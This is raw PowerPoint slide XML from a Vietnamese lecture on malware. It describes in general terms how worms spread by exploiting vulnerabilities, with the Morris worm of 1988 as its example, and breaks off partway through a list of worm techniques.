            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Chia sẻ fle</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Kh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ả năng thực thi từ xa</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Kh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ả năng truyền hoặc truy cập file từ xa</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Kh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>ả năng đăng nhập từ xa</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" noProof="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8364159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fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="4000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Cơ chế lan truyền khai thác lỗ hổng – Worm</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1600200"/>
            <a:ext cx="11353800" cy="4198938"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Mô hình lan truyền worm</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F1EFB73A-427D-46DD-AE7B-CB6B2BB6AAD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633" t="25399" r="4633" b="23880"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4648200" y="1447800"/>
            <a:ext cx="7032409" cy="5087389"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:extLst>
            <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
              <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF">
                    <a:alpha val="70000"/>
                  </a:srgbClr>
                </a:solidFill>
              </a14:hiddenFill>
            </a:ext>
          </a:extLst>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="157885924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676400" y="381000"/>
            <a:ext cx="8911687" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Cơ chế lan truyền khai thác lỗ hổng – Worm</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1828800"/>
            <a:ext cx="10746325" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" b="1" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Ví dụ sâu Morris</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Một trong những worm được biết đến nhiều nhất</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Phát tán bởi Robert Morris năm 1988</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Gây ảnh hưởng 6000 máy tính</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Gây thiệt hại $10-$100 triệu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các cuộc tấn công khác nhau trên hệ thống UNIX</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Phá mã các tập tin mật khẩu để đăng nhập vào hệ thống khác</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Khai thác bug trong giao thức UNIX inger</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Khai thác trapdoor trong tùy chọn debug của tiến trình từ xa nhận và gửi mail</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Nếu thành công, có quyền truy cập từ xa</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2400" noProof="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Gửi chương trình bootstrap để sao chép worm lên hệ thống</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7B9BF1F3-103A-465A-ACA0-721E4D026802}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="9065675" y="1676400"/>
            <a:ext cx="2897725" cy="2897725"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="36742858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2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3323"/>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="3323"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="3600"/>
              <a:t>Cơ chế lan truyền khai thác lỗ hổng – Worm</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3323" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="208899" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="0" dirty="0" err="1"/>
              <a:t>Ví</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" dirty="0" err="1"/>
              <a:t>dụ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" dirty="0" err="1"/>
              <a:t>sâu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" dirty="0"/>
              <a:t> Morris</a:t>
            </a:r>
            <a:endParaRPr lang="vi-VN" b="0" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="30725"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11493"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3733800" y="1884642"/>
            <a:ext cx="6945923" cy="42333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6532102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p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3323"/>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="3323"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="3600"/>
              <a:t>Cơ chế lan truyền khai thác lỗ hổng – Worm</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3323" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="208899" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="304800" y="1600201"/>
            <a:ext cx="8816975" cy="5399088"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Ví</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dụ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sâu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Morris</a:t>
            </a:r>
            <a:endParaRPr lang="vi-VN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="31749"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12531"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3048001" y="1600201"/>
            <a:ext cx="6251331" cy="4022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8544454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2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3323"/>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="3323"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="3600"/>
              <a:t>Cơ chế lan truyền khai thác lỗ hổng – Worm</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3323" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="208899" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Ví</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dụ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sâu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Morris</a:t>
            </a:r>
            <a:endParaRPr lang="vi-VN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="vi-VN" b="0" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent5">
                  <a:lumMod val="75000"/>
                </a:schemeClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="32773"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11531"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3505200" y="2225522"/>
            <a:ext cx="6901962" cy="3951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0623656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524000" y="381000"/>
            <a:ext cx="8911687" cy="982268"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>III. MÃ ĐỘC</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Cơ chế lan truyền khai thác lỗ hổng – Worm</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4000" b="1" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Content Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1676400"/>
            <a:ext cx="8915400" cy="4189514"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-GB" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Kỹ thuật Worm</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Multiplatform </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" i="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Đa nền</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tảng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2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Worm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> mới hơn không giới hạn ở máy Windows </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>và</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t> có thể tấn công nhiều nền tảng khác nhau, đặc biệt là các loại phổ biến </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>của UNI</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>X</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0">
